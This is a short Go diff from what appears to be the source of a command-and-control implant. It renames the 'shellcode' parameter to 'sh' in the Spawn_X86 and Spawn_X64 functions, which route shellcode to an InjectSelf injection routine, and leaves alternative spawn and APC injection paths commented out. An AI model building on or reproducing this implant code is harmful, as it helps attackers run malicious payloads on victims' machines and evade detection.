@@ -613,14 +613,14 @@ func PowershellPort(portByte []byte, b []byte) ([]byte, error) {
 
 }
 
-func Spawn_X86(shellcode []byte) ([]byte, error) {
-	//return Spawn_nt(shellcode,config.Spawnto_x86)
-	return InjectSelf(shellcode)
+func Spawn_X86(sh []byte) ([]byte, error) {
+	//return Spawn_nt(sh,config.Spawnto_x86)
+	return InjectSelf(sh)
 }
 
-func Spawn_X64(shellcode []byte) ([]byte, error) {
-	//return Spawn_APC(shellcode,config.Spawnto_x64)
-	return InjectSelf(shellcode)
+func Spawn_X64(sh []byte) ([]byte, error) {
+	//return Spawn_APC(sh,config.Spawnto_x64)
+	return InjectSelf(sh)
 }
 
 func ListProcess(b []byte) ([]byte, error) {
